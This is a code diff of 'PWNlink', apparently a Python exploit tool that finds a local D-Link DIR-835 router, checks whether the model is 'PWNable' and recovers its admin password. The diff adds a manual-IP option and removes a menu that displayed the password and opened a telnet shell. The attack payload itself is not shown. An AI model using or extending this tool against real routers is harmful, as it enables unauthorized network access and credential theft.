@@ -3,6 +3,7 @@ import requests
 import struct
 import os
 import re
+import sys
 
 ## CONFIGURATION ##
 
@@ -40,8 +41,7 @@ class Attacks:
 
 # List of supported routers, and their attack type
 routers = {
-    "DIR-835": Attacks.USERLESS,
-    "None": Attacks.USERLESS
+    "DIR-835": Attacks.USERLESS
 }
 
 
@@ -50,8 +50,6 @@ routers = {
 
 def getRouterIP() -> str:
     """ Gets the IP address of the router """
-
-    return "192.168.3.1"
 
     with open("/proc/net/route") as fh:
         for line in fh:
@@ -71,14 +69,10 @@ def getRouterType(ip: str) -> str:
         return ""
 
     # Use RE to parse router name from login page
-    title = str(re.search("<ModelName>\"(.*)\"<\/ModelName>", response).group(1))
-
-    # Check for old-style title
-    # if title == "D-LINK CORPORATION, INC | WIRELESS ROUTER | HOME":
-    #     return "DIR-628"
-
-    # if " " in title:
-    #     return None
+    try:
+        title = str(re.search("<ModelName>\"(.*)\"<\/ModelName>", response).group(1))
+    except:
+        return ""
 
     return title
 
@@ -103,37 +97,16 @@ def checkDNS() -> str:
     return socket.gethostbyname("dlinkrouter.local")
 
 
-def displayMenu():
-    print("\n-- Main Menu ")
-    for item in menu.keys():
-        print("    " + item + ") " + menu[item]["title"])
-
-
-def executeMenuSelection():
-    selection = input(">")
-
-    # Execute selection
-    if selection in menu:
-        menu[selection]["function"]()
-
-
-def spawnShell():
-    # TODO: make this auto-login
-    os.system(f"telnet {router.ip}")
-    print("Shell closed by user")
-
-
-# TUI menu
-menu = {
-    "1": {"title": "Display password", "function": lambda: print(router.password)},
-    "2": {"title": "Pop a shell", "function": spawnShell},
-    "99": {"title": "Exit", "function": exit}
-}
 
 # Main function
 
 
 def main():
+    # Check for a preset ip address
+    manual_ip = ""
+    if len(sys.argv) == 2:
+        manual_ip = sys.argv[1]
+
     # Clear screen
     os.system("clear")
 
@@ -154,39 +127,43 @@ def main():
     # Check for router dns
     print(ASCII.Reset + "    [ ] Search for router via DNS...", end="\r")
 
-    # Try to get IP addr
-    try:
-        router.ip = checkDNS()
-    except:
-        router.ip = ""
+    # Try to get IP addr if not overriding
+    if not manual_ip:
+        try:
+            router.ip = checkDNS()
+        except:
+            router.ip = ""
 
-    # Check if our previous check was successful
-    if router.ip != "":
-        status_str = ASCII.Green + \
-            "    [*] " if router.model != "" else ASCII.Yellow + "    [ ] "
-        print(ASCII.Green + "    [*] " + ASCII.Reset +
-              "Found router ip via DNS         ")
+        # Check if our previous check was successful
+        if router.ip != "":
+            status_str = ASCII.Green + \
+                "    [*] " if router.model != "" else ASCII.Yellow + "    [ ] "
+            print(ASCII.Green + "    [*] " + ASCII.Reset +
+                "Found router ip via DNS         ")
+        else:
+            # Check for router IP
+            router.ip = getRouterIP()
+            print(ASCII.Green + "    [*] " + ASCII.Reset +
+                "Found router ip via gateway (" + router.ip + ")     ")
     else:
-        # Check for router IP
-        router.ip = getRouterIP()
-        print(ASCII.Green + "    [*] " + ASCII.Reset +
-              "Found router ip via gateway (" + router.ip + ")     ")
+        print(ASCII.Green + "    [*] " + ASCII.Reset + f"Using ip address supplied by user ({manual_ip})")
+        router.ip = manual_ip
 
     # Check router type
     router.model = getRouterType(router.ip)
     status_str = ASCII.Green + \
-        "    [*] " if router.model != "" else ASCII.Yellow + "   [ ] "
+        "    [*] " if router.model != "" else ASCII.Yellow + "    [ ] "
     print(status_str + ASCII.Reset + "Check router type")
 
     # Check if oruter is PWNable
     is_pwnable = isSupported(router.model)
     status_str = ASCII.Green + \
-        "    [*] " if is_pwnable else ASCII.Yellow + "   [ ] "
+        "    [*] " if is_pwnable else ASCII.Yellow + "    [ ] "
     print(status_str + ASCII.Reset + "Check router support")
 
     # exit if router is not supported
     if not is_pwnable:
-        print("\nRouter is not supported by PWNlink")
+        print("\n    -- Router is not supported by PWNlink --\n")
         exit(1)
 
     # Check for password
